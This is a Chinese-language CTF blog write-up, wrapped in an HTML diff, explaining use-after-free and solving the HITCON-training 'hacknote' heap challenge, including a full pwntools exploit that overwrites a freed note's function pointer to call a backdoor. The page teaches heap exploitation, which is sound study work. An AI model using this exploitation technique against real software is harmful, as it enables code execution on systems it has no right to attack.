@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="无聊没事写写pwn堆吧 题目：https:&#x2F;&#x2F;github.com&#x2F;ctf-wiki&#x2F;ctf-challenges&#x2F;tree&#x2F;master&#x2F;pwn&#x2F;heap&#x2F;use_after_free&#x2F;hitcon-training-hacknote  UAF原理uaf是堆题的最常见的一种，也是生活中最常见的一种，上c语言的时候老师讲的都是处理完堆直接free()没有将ptr清0，这就导致了UAF，被释放">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Use After Free">
+<meta property="og:url" content="http://example.com/2021/09/30/UseAfter-Free/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="无聊没事写写pwn堆吧 题目：https:&#x2F;&#x2F;github.com&#x2F;ctf-wiki&#x2F;ctf-challenges&#x2F;tree&#x2F;master&#x2F;pwn&#x2F;heap&#x2F;use_after_free&#x2F;hitcon-training-hacknote  UAF原理uaf是堆题的最常见的一种，也是生活中最常见的一种，上c语言的时候老师讲的都是处理完堆直接free()没有将ptr清0，这就导致了UAF，被释放">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/09/30/UseAfter-Free/1.png">
+<meta property="og:image" content="http://example.com/2021/09/30/UseAfter-Free/2.png">
+<meta property="og:image" content="http://example.com/2021/09/30/UseAfter-Free/3.png">
+<meta property="og:image" content="http://example.com/2021/09/30/UseAfter-Free/4.png">
+<meta property="og:image" content="http://example.com/2021/09/30/UseAfter-Free/5.png">
+<meta property="og:image" content="http://example.com/2021/09/30/UseAfter-Free/6.png">
+<meta property="og:image" content="http://example.com/2021/09/30/UseAfter-Free/7.png">
+<meta property="og:image" content="http://example.com/2021/09/30/UseAfter-Free/8.png">
+<meta property="og:image" content="http://example.com/2021/09/30/UseAfter-Free/9.png">
+<meta property="og:image" content="http://example.com/2021/09/30/UseAfter-Free/10.png">
+<meta property="og:image" content="http://example.com/2021/09/30/UseAfter-Free/11.png">
+<meta property="og:image" content="http://example.com/2021/09/30/UseAfter-Free/12.png">
+<meta property="og:image" content="http://example.com/2021/09/30/UseAfter-Free/13.png">
+<meta property="article:published_time" content="2021-09-30T07:40:53.000Z">
+<meta property="article:modified_time" content="2022-05-06T00:48:31.414Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/09/30/UseAfter-Free/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Use After Free</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2021/10/01/unlink/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/09/30/UseAfter-Free/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/09/30/UseAfter-Free/&text=Use After Free"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/09/30/UseAfter-Free/&title=Use After Free"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/09/30/UseAfter-Free/&is_video=false&description=Use After Free"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Use After Free&body=Check out this article: http://example.com/2021/09/30/UseAfter-Free/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/09/30/UseAfter-Free/&title=Use After Free"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/09/30/UseAfter-Free/&title=Use After Free"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/09/30/UseAfter-Free/&title=Use After Free"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/09/30/UseAfter-Free/&title=Use After Free"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/09/30/UseAfter-Free/&name=Use After Free&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/09/30/UseAfter-Free/&t=Use After Free"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#UAF%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">UAF原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-number">2.</span> <span class="toc-text">例子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-number">3.</span> <span class="toc-text">实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.</span> <span class="toc-text">分析函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#add-note"><span class="toc-number">3.1.1.</span> <span class="toc-text">add_note</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#del-note"><span class="toc-number">3.1.2.</span> <span class="toc-text">del_note</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#print-note"><span class="toc-number">3.1.3.</span> <span class="toc-text">print_note</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#magic"><span class="toc-number">3.1.4.</span> <span class="toc-text">magic</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞利用思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99exp"><span class="toc-number">3.3.</span> <span class="toc-text">编写exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">4.</span> <span class="toc-text">exp</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Use After Free
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-09-30T07:40:53.000Z" itemprop="datePublished">2021-09-30</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/study/">study</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <font size="4">
+
+<blockquote>
+<p>无聊没事写写pwn堆吧</p>
+<p>题目：<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote</a></p>
+</blockquote>
+<h2 id="UAF原理"><a href="#UAF原理" class="headerlink" title="UAF原理"></a>UAF原理</h2><p>uaf是堆题的最常见的一种，也是生活中最常见的一种，上c语言的时候老师讲的都是处理完堆直接free()没有将ptr清0，这就导致了UAF，被释放后没有被设置为NULL的内存指针，为dangling pointer（悬空指针、悬垂指针）。</p>
+<blockquote>
+<p>内存块被释放后，其对应的指针被设置为NULL，再次使用时程序会崩溃<br>内存块被释放后，其对应的指针没有被设置为NULL，在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序有可能可以正常运转<br>内存块被释放后，其对应的指针没有被设置为NULL，但是在下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能出现问题</p>
+</blockquote>
+<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>直接上一个代码吧。(借来了ctf-wiki的)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">name</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> *myname;</span><br><span class="line">  <span class="type">void</span> (*func)(<span class="type">char</span> *str);</span><br><span class="line">&#125; NAME;</span><br><span class="line"><span class="type">void</span> <span class="title function_">myprint</span><span class="params">(<span class="type">char</span> *str)</span> &#123; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str); </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">printmyname</span><span class="params">()</span> &#123; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;call print my name\n&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  NAME *a;</span><br><span class="line">  a = (NAME *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> name));</span><br><span class="line">  a-&gt;func = myprint;</span><br><span class="line">  a-&gt;myname = <span class="string">&quot;I can also use it&quot;</span>;</span><br><span class="line">  a-&gt;func(<span class="string">&quot;this is my function&quot;</span>);</span><br><span class="line">  <span class="comment">// free without modify</span></span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  a-&gt;func(<span class="string">&quot;I can also use it&quot;</span>); <span class="comment">//此处注意，free之后程序仍然可以正常运行</span></span><br><span class="line">  <span class="comment">// free with modify</span></span><br><span class="line">  a-&gt;func = printmyname;</span><br><span class="line">  a-&gt;func(<span class="string">&quot;this is my function&quot;</span>);</span><br><span class="line">  <span class="comment">// set NULL</span></span><br><span class="line">  a = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;this program will crash...\n&quot;</span>);</span><br><span class="line">  a-&gt;func(<span class="string">&quot;can not be printed...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>libc-2.23.so的版本来搞一下</p>
+<p><img src="/2021/09/30/UseAfter-Free/1.png"></p>
+<blockquote>
+<p>可以看到free(a);之后还可以继续运行，因为该指针没有清0，里面还有数据，再继续运行到最后，因为指针被清0了，函数被清0，所以程序就会出错</p>
+</blockquote>
+<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>直接下载程序，直接查看保护，可以改got表</p>
+<p><img src="/2021/09/30/UseAfter-Free/2.png"></p>
+<h3 id="分析函数"><a href="#分析函数" class="headerlink" title="分析函数"></a>分析函数</h3><blockquote>
+<p>可以直接看源码，那就直接看吧（隐藏IDA分析菜的事实</p>
+</blockquote>
+<h4 id="add-note"><a href="#add-note" class="headerlink" title="add_note"></a>add_note</h4><p><img src="/2021/09/30/UseAfter-Free/3.png"></p>
+<p><img src="/2021/09/30/UseAfter-Free/4.png" alt="4"></p>
+<blockquote>
+<p>只可以5次add，其他也没什么别的直接自动化函数吧</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Note size :&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Content :&#x27;</span>, content)</span><br></pre></td></tr></table></figure>
+
+<h4 id="del-note"><a href="#del-note" class="headerlink" title="del_note"></a>del_note</h4><p><img src="/2021/09/30/UseAfter-Free/5.png"></p>
+<blockquote>
+<p>第58行59行free之后没有将指针清0，uaf！！上函数</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index))</span><br></pre></td></tr></table></figure>
+
+<h4 id="print-note"><a href="#print-note" class="headerlink" title="print_note"></a>print_note</h4><p><img src="/2021/09/30/UseAfter-Free/6.png"></p>
+<blockquote>
+<p>这个没什么说的，理解理解吧，打pwn仔细看代码很重要</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index))</span><br></pre></td></tr></table></figure>
+
+<h4 id="magic"><a href="#magic" class="headerlink" title="magic"></a>magic</h4><p><img src="/2021/09/30/UseAfter-Free/7.png"></p>
+<blockquote>
+<p>看到这里那这一题不是so easy？</p>
+</blockquote>
+<h3 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h3><p>因为有uaf和后门函数，也可以拿shell，但是题目嘛，直接拿flag就行。将后门函数写入content，覆盖print_note_content的地址，从而执行后门函数</p>
+<h3 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h3><p>先创建两个note试试吧。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;aaaa\n&#x27;</span>);</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;bbbb\n&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/30/UseAfter-Free/8.png"></p>
+<blockquote>
+<p>可以看到00-10是print_note。10-38是content</p>
+</blockquote>
+<p>因为有uaf，所以直接释放</p>
+<p><img src="/2021/09/30/UseAfter-Free/9.png"></p>
+<blockquote>
+<p>上面一个红框是note0的print_note，下面两个框是note1的print_note，释放之后，note1的print_note的fd指向note0的print_note，而note1的content的fd指向note0的content，看一下bin吧，更清楚</p>
+</blockquote>
+<p><img src="/2021/09/30/UseAfter-Free/10.png"></p>
+<p>再申请一个小的chunk，构造payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(magic);</span><br><span class="line">add(<span class="number">0x8</span>, paylaod)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>payload之所以这么构造是因为创建了8个字节的空间，可以直接从0x10的fastbin中拿，而创建print_note和content这些指针只要0x10就行了，所以0x804b038给了print_note和content的指针，而content后内容是0x804b008，payload填充到对应的0x804b008这个地址去，magic就会覆盖过去</p>
+</blockquote>
+<p><img src="/2021/09/30/UseAfter-Free/11.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>0x804867b是print_note_content，直接show(0)就会用print_content，而payload早就填到这里了，所以show(0)就会执行magic</p>
+</blockquote>
+<p><img src="/2021/09/30/UseAfter-Free/12.png"></p>
+<p>可以直接get_flag了</p>
+<p><img src="/2021/09/30/UseAfter-Free/13.png"></p>
+<blockquote>
+<p>因为本地没有flag，打远程就行</p>
+</blockquote>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./z1r0&#x27;</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./2.23/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&#x27;Your choice :&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Note size :&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Content :&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;aaaa\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;bbbb\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line">add(<span class="number">0x8</span>, p32(magic))</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+</font>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#UAF%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">UAF原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-number">2.</span> <span class="toc-text">例子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-number">3.</span> <span class="toc-text">实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.</span> <span class="toc-text">分析函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#add-note"><span class="toc-number">3.1.1.</span> <span class="toc-text">add_note</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#del-note"><span class="toc-number">3.1.2.</span> <span class="toc-text">del_note</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#print-note"><span class="toc-number">3.1.3.</span> <span class="toc-text">print_note</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#magic"><span class="toc-number">3.1.4.</span> <span class="toc-text">magic</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞利用思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99exp"><span class="toc-number">3.3.</span> <span class="toc-text">编写exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">4.</span> <span class="toc-text">exp</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/09/30/UseAfter-Free/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/09/30/UseAfter-Free/&text=Use After Free"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/09/30/UseAfter-Free/&title=Use After Free"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/09/30/UseAfter-Free/&is_video=false&description=Use After Free"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Use After Free&body=Check out this article: http://example.com/2021/09/30/UseAfter-Free/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/09/30/UseAfter-Free/&title=Use After Free"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/09/30/UseAfter-Free/&title=Use After Free"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/09/30/UseAfter-Free/&title=Use After Free"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/09/30/UseAfter-Free/&title=Use After Free"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/09/30/UseAfter-Free/&name=Use After Free&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/09/30/UseAfter-Free/&t=Use After Free"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2022
+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
